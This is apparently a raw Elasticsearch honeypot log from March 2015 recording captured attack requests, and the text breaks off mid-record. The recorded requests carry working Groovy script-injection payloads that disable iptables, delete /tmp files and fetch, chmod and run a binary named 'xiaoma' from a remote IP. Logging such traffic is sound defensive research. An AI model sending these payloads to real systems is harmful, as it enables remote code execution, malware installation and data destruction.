{
    "source": "176.108.160.242",
    "@timestamp": "2015-03-23T00:21:52.995130935Z",
    "url": "x.x.x.x:9200/_search",
    "method": "POST",
    "form": "",
    "payload": "{\"test\" : \"test\"}",
    "headers": {
        "user_agent": "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.91 Safari/537.36",
        "host": "x.x.x.x:9200",
        "content_type": "application/json",
        "accept_language": ""
    },
    "type": "attack",
    "honeypot": "x.x.x.x"
}
{
    "source": "176.108.160.242",
    "@timestamp": "2015-03-23T00:22:37.122009391Z",
    "url": "x.x.x.x:9200/_search",
    "method": "POST",
    "form": "",
    "payload": "{\"test\" : \"test\"}",
    "headers": {
        "user_agent": "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.91 Safari/537.36",
        "host": "x.x.x.x:9200",
        "content_type": "application/json",
        "accept_language": ""
    },
    "type": "attack",
    "honeypot": "x.x.x.x"
}
{
    "source": "61.160.232.202",
    "@timestamp": "2015-03-23T00:51:07.362549081Z",
    "url": "x.x.x.x:9200/_search?pretty",
    "method": "post",
    "form": "pretty=",
    "payload": "{\"size\":1,\"script_fields\": {\"exp\": {\"script\":\"java.lang.Math.class.forName(\\\"java.io.BufferedReader\\\").getConstructor(java.io.Reader.class).newInstance(java.lang.Math.class.forName(\\\"java.io.InputStreamReader\\\").getConstructor(java.io.InputStream.class).newInstance(java.lang.Math.class.forName(\\\"java.lang.Runtime\\\").getRuntime().exec(\\\"echo qq952135763\\\").getInputStream())).readLines()\",\"lang\": \"groovy\"}}}",
    "headers": {
        "user_agent": "Java/1.8.0_31",
        "host": "x.x.x.x:9200",
        "content_type": "application/x-www-form-urlencoded",
        "accept_language": "zh-CN"
    },
    "type": "attack",
    "honeypot": "x.x.x.x"
}
{
    "source": "60.173.26.163",
    "@timestamp": "2015-03-23T04:00:41.491354275Z",
    "url": "x.x.x.x:9200/_search?pretty",
    "method": "POST",
    "form": "pretty=&%7B%22size%22%3A1%2C+%22script_fields%22%3A+%7B%22lupin%22%3A%7B%22script%22%3A+%22java.lang.Math.class.forName%28%5C%22java.lang.Runtime%5C%22%29.getRuntime%28%29.exec%28%5C%22id%5C%22%29.getText%28%29%22%7D%7D%7D=",
    "payload": "",
    "headers": {
        "user_agent": "Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)",
        "host": "x.x.x.x:9200",
        "content_type": "application/x-www-form-urlencoded",
        "accept_language": "zh-cn"
    },
    "type": "attack",
    "honeypot": "x.x.x.x"
}
{
    "source": "222.186.31.83",
    "@timestamp": "2015-03-23T04:56:10.849976426Z",
    "url": "x.x.x.x:9200/_search?source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match%5Fall%22%3A%7B%7D%7D%7D%7D%2C%22script%5Ffields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import%20java.util.%2A%3B%5Cnimport%20java.io.%2A%3B%5CnString%20str%20%3D%20%5C%22%5C%22%3BBufferedReader%20br%20%3D%20new%20BufferedReader%28new%20InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22service%20iptables%20stop%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder%20sb%20%3D%20new%20StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D",
    "method": "GET",
    "form": "source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match_all%22%3A%7B%7D%7D%7D%7D%2C%22script_fields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import+java.util.%2A%3B%5Cnimport+java.io.%2A%3B%5CnString+str+%3D+%5C%22%5C%22%3BBufferedReader+br+%3D+new+BufferedReader%28new+InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22service+iptables+stop%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder+sb+%3D+new+StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D",
    "payload": "",
    "headers": {
        "user_agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)",
        "host": "x.x.x.x:9200",
        "content_type": "",
        "accept_language": ""
    },
    "type": "attack",
    "honeypot": "x.x.x.x"
}
{
    "source": "222.186.31.83",
    "@timestamp": "2015-03-23T04:56:11.551812242Z",
    "url": "x.x.x.x:9200/_search?source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match%5Fall%22%3A%7B%7D%7D%7D%7D%2C%22script%5Ffields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import%20java.util.%2A%3B%5Cnimport%20java.io.%2A%3B%5CnString%20str%20%3D%20%5C%22%5C%22%3BBufferedReader%20br%20%3D%20new%20BufferedReader%28new%20InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22rm%20-r%20%2Ftmp%2F%2A%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder%20sb%20%3D%20new%20StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D",
    "method": "GET",
    "form": "source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match_all%22%3A%7B%7D%7D%7D%7D%2C%22script_fields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import+java.util.%2A%3B%5Cnimport+java.io.%2A%3B%5CnString+str+%3D+%5C%22%5C%22%3BBufferedReader+br+%3D+new+BufferedReader%28new+InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22rm+-r+%2Ftmp%2F%2A%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder+sb+%3D+new+StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D",
    "payload": "",
    "headers": {
        "user_agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)",
        "host": "x.x.x.x:9200",
        "content_type": "",
        "accept_language": ""
    },
    "type": "attack",
    "honeypot": "x.x.x.x"
}
{
    "source": "222.186.31.83",
    "@timestamp": "2015-03-23T04:56:16.845415288Z",
    "url": "x.x.x.x:9200/_search?source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match%5Fall%22%3A%7B%7D%7D%7D%7D%2C%22script%5Ffields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import%20java.util.%2A%3B%5Cnimport%20java.io.%2A%3B%5CnString%20str%20%3D%20%5C%22%5C%22%3BBufferedReader%20br%20%3D%20new%20BufferedReader%28new%20InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22wget%20-O%20%2Ftmp%2Fxiaoma%20http%3A%2F%2F222.186.31.83%3A8080%2Fxiaoma%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder%20sb%20%3D%20new%20StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D",
    "method": "GET",
    "form": "source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match_all%22%3A%7B%7D%7D%7D%7D%2C%22script_fields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import+java.util.%2A%3B%5Cnimport+java.io.%2A%3B%5CnString+str+%3D+%5C%22%5C%22%3BBufferedReader+br+%3D+new+BufferedReader%28new+InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22wget+-O+%2Ftmp%2Fxiaoma+http%3A%2F%2F222.186.31.83%3A8080%2Fxiaoma%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder+sb+%3D+new+StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D",
    "payload": "",
    "headers": {
        "user_agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)",
        "host": "x.x.x.x:9200",
        "content_type": "",
        "accept_language": ""
    },
    "type": "attack",
    "honeypot": "x.x.x.x"
}
{
    "source": "222.186.31.83",
    "@timestamp": "2015-03-23T04:56:22.129739055Z",
    "url": "x.x.x.x:9200/_search?source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match%5Fall%22%3A%7B%7D%7D%7D%7D%2C%22script%5Ffields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import%20java.util.%2A%3B%5Cnimport%20java.io.%2A%3B%5CnString%20str%20%3D%20%5C%22%5C%22%3BBufferedReader%20br%20%3D%20new%20BufferedReader%28new%20InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22chmod%20777%20%2Ftmp%2Fxiaoma%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder%20sb%20%3D%20new%20StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D",
    "method": "GET",
    "form": "source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match_all%22%3A%7B%7D%7D%7D%7D%2C%22script_fields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import+java.util.%2A%3B%5Cnimport+java.io.%2A%3B%5CnString+str+%3D+%5C%22%5C%22%3BBufferedReader+br+%3D+new+BufferedReader%28new+InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22chmod+777+%2Ftmp%2Fxiaoma%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder+sb+%3D+new+StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D",
    "payload": "",
    "headers": {
        "user_agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)",
        "host": "x.x.x.x:9200",
        "content_type": "",
        "accept_language": ""
    },
    "type": "attack",
    "honeypot": "x.x.x.x"
}
{
    "source": "222.186.31.83",
    "@timestamp": "2015-03-23T04:56:27.446269508Z",
    "url": "x.x.x.x:9200/_search?source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match%5Fall%22%3A%7B%7D%7D%7D%7D%2C%22script%5Ffields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import%20java.util.%2A%3B%5Cnimport%20java.io.%2A%3B%5CnString%20str%20%3D%20%5C%22%5C%22%3BBufferedReader%20br%20%3D%20new%20BufferedReader%28new%20InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22nohup%20%2Ftmp%2Fxiaoma%20%3E%20%2Fdev%2Fnull%202%3E%261%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder%20sb%20%3D%20new%20StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D",
    "method": "GET",
    "form": "source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match_all%22%3A%7B%7D%7D%7D%7D%2C%22script_fields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import+java.util.%2A%3B%5Cnimport+java.io.%2A%3B%5CnString+str+%3D+%5C%22%5C%22%3BBufferedReader+br+%3D+new+BufferedReader%28new+InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22nohup+%2Ftmp%2Fxiaoma+%3E+%2Fdev%2Fnull+2%3E%261%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder+sb+%3D+new+StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D",
    "payload": "",
    "headers": {
        "user_agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)",
        "host": "x.x.x.x:9200",
        "content_type": "",
        "accept_language": ""
    },
    "type": "attack",
    "honeypot": "x.x.x.x"
}
{
    "source": "222.186.31.83",
    "@timestamp": "2015-03-23T04:56:32.754676712Z",
    "url": "x.x.x.x:9200/_search?source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match%5Fall%22%3A%7B%7D%7D%7D%7D%2C%22script%5Ffields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import%20java.util.%2A%3B%5Cnimport%20java.io.%2A%3B%5CnString%20str%20%3D%20%5C%22%5C%22%3BBufferedReader%20br%20%3D%20new%20BufferedReader%28new%20InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22%2Ftmp%2Fxiaoma%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder%20sb%20%3D%20new%20StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D",
    "method": "GET",
    "form": "source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match_all%22%3A%7B%7D%7D%7D%7D%2C%22script_fields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import+java.util.%2A%3B%5Cnimport+java.io.%2A%3B%5CnString+str+%3D+%5C%22%5C%22%3BBufferedReader+br+%3D+new+BufferedReader%28new+InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22%2Ftmp%2Fxiaoma%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder+sb+%3D+new+StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D",
    "payload": "",
    "headers": {
        "user_agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)",
        "host": "x.x.x.x:9200",
        "content_type": "",
        "accept_language": ""
    },
    "type": "attack",
    "honeypot": "x.x.x.x"
}
{
    "source": "222.186.31.83",
    "@timestamp": "2015-03-23T04:56:38.057697958Z",
    "url": "x.x.x.x:9200/_search?source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match%5Fall%22%3A%7B%7D%7D%7D%7D%2C%22script%5Ffields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import%20java.util.%2A%3B%5Cnimport%20java.io.%2A%3B%5CnString%20str%20%3D%20%5C%22%5C%22%3BBufferedReader%20br%20%3D%20new%20BufferedReader%28new%20InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22.%2Ftmp%2Fxiaoma%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder%20sb%20%3D%20new%20StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D",
    "method": "GET",
    "form": "source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match_all%22%3A%7B%7D%7D%7D%7D%2C%22script_fields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import+java.util.%2A%3B%5Cnimport+java.io.%2A%3B%5CnString+str+%3D+%5C%22%5C%22%3BBufferedReader+br+%3D+new+BufferedReader%28new+InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22.%2Ftmp%2Fxiaoma%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder+sb+%3D+new+StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D",
    "payload": "",
    "headers": {
        "user_agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)",
        "host": "x.x.x.x:9200",
        "content_type": "",
        "accept_language": ""
    },
    "type": "attack",
    "honeypot": "x.x.x.x"
}
{
    "source": "222.186.31.83",
    "@timestamp": "2015-03-23T04:56:43.342169032Z",
    "url": "x.x.x.x:9200/_search?source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match%5Fall%22%3A%7B%7D%7D%7D%7D%2C%22script%5Ffields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import%20java.util.%2A%3B%5Cnimport%20java.io.%2A%3B%5CnString%20str%20%3D%20%5C%22%5C%22%3BBufferedReader%20br%20%3D%20new%20BufferedReader%28new%20InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22wget%20-O%20%2Ftmp%2Fxiaoma%20http%3A%2F%2F222.186.31.83%3A8080%2Fxiaoma%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder%20sb%20%3D%20new%20StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D",
    "method": "GET",
    "form": "source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match_all%22%3A%7B%7D%7D%7D%7D%2C%22script_fields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import+java.util.%2A%3B%5Cnimport+java.io.%2A%3B%5CnString+str+%3D+%5C%22%5C%22%3BBufferedReader+br+%3D+new+BufferedReader%28new+InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22wget+-O+%2Ftmp%2Fxiaoma+http%3A%2F%2F222.186.31.83%3A8080%2Fxiaoma%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder+sb+%3D+new+StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D",
    "payload": "",
    "headers": {
        "user_agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)",
        "host": "x.x.x.x:9200",
        "content_type": "",
        "accept_language": ""
    },
    "type": "attack",
    "honeypot": "x.x.x.x"
}
{
    "source": "222.186.31.83",
    "@timestamp": "2015-03-23T04:56:48.65231549Z",
    "url": "x.x.x.x:9200/_search?source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match%5Fall%22%3A%7B%7D%7D%7D%7D%2C%22script%5Ffields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import%20java.util.%2A%3B%5Cnimport%20java.io.%2A%3B%5CnString%20str%20%3D%20%5C%22%5C%22%3BBufferedReader%20br%20%3D%20new%20BufferedReader%28new%20InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22chmod%20777%20%2Ftmp%2Fxiaoma%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder%20sb%20%3D%20new%20StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D",
    "method": "GET",
    "form": "source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match_all%22%3A%7B%7D%7D%7D%7D%2C%22script_fields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import+java.util.%2A%3B%5Cnimport+java.io.%2A%3B%5CnString+str+%3D+%5C%22%5C%22%3BBufferedReader+br+%3D+new+BufferedReader%28new+InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22chmod+777+%2Ftmp%2Fxiaoma%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder+sb+%3D+new+StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D",
    "payload": "",
    "headers": {
        "user_agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)",
        "host": "x.x.x.x:9200",
        "content_type": "",
        "accept_language": ""
    },
    "type": "attack",
    "honeypot": "x.x.x.x"
}
{
    "source": "222.186.31.83",
    "@timestamp": "2015-03-23T04:56:54.000453062Z",
    "url": "x.x.x.x:9200/_search?source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match%5Fall%22%3A%7B%7D%7D%7D%7D%2C%22script%5Ffields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import%20java.util.%2A%3B%5Cnimport%20java.io.%2A%3B%5CnString%20str%20%3D%20%5C%22%5C%22%3BBufferedReader%20br%20%3D%20new%20BufferedReader%28new%20InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22nohup%20%2Ftmp%2Fxiaoma%20%3E%20%2Fdev%2Fnull%202%3E%261%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder%20sb%20%3D%20new%20StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D",
    "method": "GET",
    "form": "source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match_all%22%3A%7B%7D%7D%7D%7D%2C%22script_fields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import+java.util.%2A%3B%5Cnimport+java.io.%2A%3B%5CnString+str+%3D+%5C%22%5C%22%3BBufferedReader+br+%3D+new+BufferedReader%28new+InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22nohup+%2Ftmp%2Fxiaoma+%3E+%2Fdev%2Fnull+2%3E%261%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder+sb+%3D+new+StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D",
    "payload": "",
    "headers": {
        "user_agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)",
        "host": "x.x.x.x:9200",
        "content_type": "",
        "accept_language": ""
    },
    "type": "attack",
    "honeypot": "x.x.x.x"
}
{
    "source": "222.186.31.83",
    "@timestamp": "2015-03-23T04:56:59.338000612Z",
    "url": "x.x.x.x:9200/_search?source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match%5Fall%22%3A%7B%7D%7D%7D%7D%2C%22script%5Ffields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import%20java.util.%2A%3B%5Cnimport%20java.io.%2A%3B%5CnString%20str%20%3D%20%5C%22%5C%22%3BBufferedReader%20br%20%3D%20new%20BufferedReader%28new%20InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22%2Ftmp%2Fxiaoma%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder%20sb%20%3D%20new%20StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D",
    "method": "GET",
    "form": "source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match_all%22%3A%7B%7D%7D%7D%7D%2C%22script_fields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import+java.util.%2A%3B%5Cnimport+java.io.%2A%3B%5CnString+str+%3D+%5C%22%5C%22%3BBufferedReader+br+%3D+new+BufferedReader%28new+InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22%2Ftmp%2Fxiaoma%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder+sb+%3D+new+StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D",
    "payload": "",
    "headers": {
        "user_agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)",
        "host": "x.x.x.x:9200",
        "content_type": "",
        "accept_language": ""
    },
    "type": "attack",
    "honeypot": "x.x.x.x"
}
{
    "source": "222.186.31.83",
    "@timestamp": "2015-03-23T04:57:04.645510539Z",
    "url": "x.x.x.x:9200/_search?source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match%5Fall%22%3A%7B%7D%7D%7D%7D%2C%22script%5Ffields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import%20java.util.%2A%3B%5Cnimport%20java.io.%2A%3B%5CnString%20str%20%3D%20%5C%22%5C%22%3BBufferedReader%20br%20%3D%20new%20BufferedReader%28new%20InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22.%2Ftmp%2Fxiaoma%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder%20sb%20%3D%20new%20StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D",
    "method": "GET",
    "form": "source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match_all%22%3A%7B%7D%7D%7D%7D%2C%22script_fields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import+java.util.%2A%3B%5Cnimport+java.io.%2A%3B%5CnString+str+%3D+%5C%22%5C%22%3BBufferedReader+br+%3D+new+BufferedReader%28new+InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22.%2Ftmp%2Fxiaoma%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder+sb+%3D+new+StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D",
    "payload": "",
    "headers": {
        "user_agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)",
        "host": "x.x.x.x:9200",
        "content_type": "",
        "accept_language": ""
    },
    "type": "attack",
    "honeypot": "x.x.x.x"
}
{
    "source": "222.186.31.83",
    "@timestamp": "2015-03-23T04:57:09.958928067Z",
    "url": "x.x.x.x:9200/_search?source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match%5Fall%22%3A%7B%7D%7D%7D%7D%2C%22script%5Ffields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import%20java.util.%2A%3B%5Cnimport%20java.io.%2A%3B%5CnString%20str%20%3D%20%5C%22%5C%22%3BBufferedReader%20br%20%3D%20new%20BufferedReader%28new%20InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22wget%20-O%20%2Ftmp%2Fxiaoma1%20http%3A%2F%2F222.186.31.83%3A8080%2Fxiaoma%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder%20sb%20%3D%20new%20StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D",
    "method": "GET",
    "form": "source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match_all%22%3A%7B%7D%7D%7D%7D%2C%22script_fields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import+java.util.%2A%3B%5Cnimport+java.io.%2A%3B%5CnString+str+%3D+%5C%22%5C%22%3BBufferedReader+br+%3D+new+BufferedReader%28new+InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22wget+-O+%2Ftmp%2Fxiaoma1+http%3A%2F%2F222.186.31.83%3A8080%2Fxiaoma%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder+sb+%3D+new+StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D",
    "payload": "",
    "headers": {
        "user_agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)",
        "host": "x.x.x.x:9200",
        "content_type": "",
        "accept_language": ""
    },
    "type": "attack",
    "honeypot": "x.x.x.x"
}
{
    "source": "222.186.31.83",
    "@timestamp": "2015-03-23T04:57:15.262823919Z",
    "url": "x.x.x.x:9200/_search?source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match%5Fall%22%3A%7B%7D%7D%7D%7D%2C%22script%5Ffields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import%20java.util.%2A%3B%5Cnimport%20java.io.%2A%3B%5CnString%20str%20%3D%20%5C%22%5C%22%3BBufferedReader%20br%20%3D%20new%20BufferedReader%28new%20InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22su%20root%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder%20sb%20%3D%20new%20StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D",
    "method": "GET",
